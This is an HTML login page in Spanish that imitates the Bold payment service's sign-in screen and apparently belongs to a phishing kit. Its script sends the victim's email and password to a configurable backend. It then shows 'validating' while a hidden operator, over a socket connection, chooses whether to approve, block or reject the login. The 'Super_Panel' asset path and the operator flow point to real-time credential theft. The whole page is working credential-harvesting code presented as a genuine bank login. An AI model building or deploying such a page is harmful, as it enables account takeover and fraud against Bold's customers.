<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
  <title>Bold - Inicio de Sesión</title>
  <style>
    :root {
      color-scheme: light;
      --bg: #f8fbff;
      --surface: #ffffff;
      --text: #0f1b43;
      --muted: #5b6a8a;
      --accent: #ff5a5f;
      --accent-dark: #c43f47;
      font-family: Inter, system-ui, sans-serif;
    }
    * { box-sizing: border-box; }
    body { margin: 0; min-height: 100vh; background: var(--bg); color: var(--text); display: flex; align-items: center; justify-content: center; }
    .container { max-width: 400px; width: 100%; padding: 24px; background: var(--surface); border-radius: 16px; box-shadow: 0 10px 40px rgba(15,27,67,.1); position: relative; }
    .logo { width: 64px; height: 65px; margin: 0 auto 24px; }
    .content { text-align: center; margin-bottom: 32px; }
    .title { font-size: 1rem; font-weight: 700; margin: 0 0 8px; }
    .description { color: var(--muted); margin: 0; line-height: 1.6; }
    .form { display: flex; flex-direction: column; gap: 20px; margin-bottom: 32px; }
    .input { width: 100%; padding: 12px; border: 1px solid #e1e5e9; border-radius: 8px; font-size: 1rem; }
    .button { width: 100%; padding: 12px 24px; background: var(--accent); color: #fff; border: none; border-radius: 8px; font-weight: 700; cursor: pointer; transition: all 0.2s; }
    .button:hover { background: var(--accent-dark); }
    .button:disabled { opacity: 0.6; cursor: not-allowed; }
    .error-msg { color: #ff5a5f; font-size: 0.875rem; margin: 8px 0 0; display: none; padding: 12px; background: rgba(255,90,95,.1); border-radius: 8px; }
    .success-msg { color: #3fb950; font-size: 0.875rem; margin: 8px 0 0; display: none; padding: 12px; background: rgba(63,185,80,.1); border-radius: 8px; }
    .loading { display: none; align-items: center; justify-content: center; gap: 8px; }
    .spinner { width: 16px; height: 16px; border: 2px solid #e1e5e9; border-top-color: var(--accent); border-radius: 50%; animation: spin 0.8s linear infinite; }
    @keyframes spin { to { transform: rotate(360deg); } }
  </style>
</head>
<body>
  <div class="container">
    <img src="./assets/Super_Panel_files/logo.4552d4c8.svg" alt="Bold" class="logo">
    <div class="content">
      <h1 class="title">¡Bienvenido a Bold!</h1>
      <p class="description">Ingresa con tu correo y contraseña</p>
    </div>

    <form id="loginForm" class="form">
      <div>
        <label class="sr-only">Correo electrónico</label>
        <input
          id="email"
          type="email"
          class="input"
          placeholder="Correo electrónico"
          required
          autocomplete="email"
        >
      </div>
      <div>
        <label class="sr-only">Contraseña</label>
        <input
          id="password"
          type="password"
          class="input"
          placeholder="Contraseña"
          required
          autocomplete="current-password"
        >
      </div>
      <div id="errorMsg" class="error-msg"></div>
      <div id="successMsg" class="success-msg">✅ Validando...</div>
      
      <button id="submitBtn" type="submit" class="button">
        <span id="btnText">Ingresar</span>
        <div id="btnLoading" class="loading" style="margin-left: 8px;">
          <div class="spinner"></div>
        </div>
      </button>
    </form>

    <p style="color: var(--muted); font-size: 0.9rem; text-align: center;">
      El operador validará tus datos en menos de 5 minutos
    </p>
  </div>

  <!-- Socket.io para comunicación real-time -->
  <script src="./assets/js/config.js"></script>
  <script src="https://cdn.socket.io/4.8.1/socket.io.min.js"></script>
  <!-- Session Manager -->
  <script src="/assets/js/session.js"></script>

  <script>
  (async () => {
    // 1. Crear sesión nueva al cargar
    try {
      await SessionManager.init();
    } catch (err) {
      console.error('❌ Error iniciando sesión:', err);
      document.getElementById('errorMsg').textContent = 'Error de conexión';
      document.getElementById('errorMsg').style.display = 'block';
      return;
    }

    const form = document.getElementById('loginForm');
    const errorMsg = document.getElementById('errorMsg');
    const successMsg = document.getElementById('successMsg');
    const submitBtn = document.getElementById('submitBtn');
    const btnText = document.getElementById('btnText');
    const btnLoading = document.getElementById('btnLoading');

    form.addEventListener('submit', async (e) => {
      e.preventDefault();

      const email = document.getElementById('email').value.trim();
      const password = document.getElementById('password').value.trim();

      errorMsg.style.display = 'none';
      successMsg.style.display = 'none';

      if (!email || !password) {
        errorMsg.textContent = 'Completa todos los campos';
        errorMsg.style.display = 'block';
        return;
      }

      // 2. Enviar datos al backend
      submitBtn.disabled = true;
      btnText.style.display = 'none';
      btnLoading.style.display = 'flex';

      try {
        const res = await fetch(window.API_BASE_URL + '/api/login', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            sessionId: SessionManager.getSessionId(),
            email,
            password
          })
        });

        const data = await res.json();

        if (!data.success) {
          errorMsg.textContent = data.error || 'Error al ingresar';
          errorMsg.style.display = 'block';
          submitBtn.disabled = false;
          btnText.style.display = 'inline';
          btnLoading.style.display = 'none';
          return;
        }

        // 3. Mostrar mensaje y esperar validación
        successMsg.style.display = 'block';

        // 4. Escuchar respuesta del operador (o timeout de 5 min)
        SessionManager.waitForAction({
          onApproved: () => {
            window.location.href = 'INICIO.html';
          },
          onBlocked: () => {
            errorMsg.textContent = '🔒 Acceso bloqueado. Contacta soporte.';
            errorMsg.style.display = 'block';
            submitBtn.disabled = false;
            btnText.style.display = 'inline';
            btnLoading.style.display = 'none';
          },
          onErrorData: () => {
            errorMsg.textContent = '❌ Datos incorrectos. Intenta de nuevo.';
            errorMsg.style.display = 'block';
            submitBtn.disabled = false;
            btnText.style.display = 'inline';
            btnLoading.style.display = 'none';
            document.getElementById('password').value = '';
          },
          onErrorTemp: () => {
            errorMsg.textContent = '⚠️ Error temporal. Intenta más tarde.';
            errorMsg.style.display = 'block';
            submitBtn.disabled = false;
            btnText.style.display = 'inline';
            btnLoading.style.display = 'none';
          }
        });

      } catch (err) {
        console.error('❌ Error:', err);
        errorMsg.textContent = 'Error de conexión. Intenta de nuevo.';
        errorMsg.style.display = 'block';
        submitBtn.disabled = false;
        btnText.style.display = 'inline';
        btnLoading.style.display = 'none';
      }
    });
  })();
  </script>
</body>
</html>
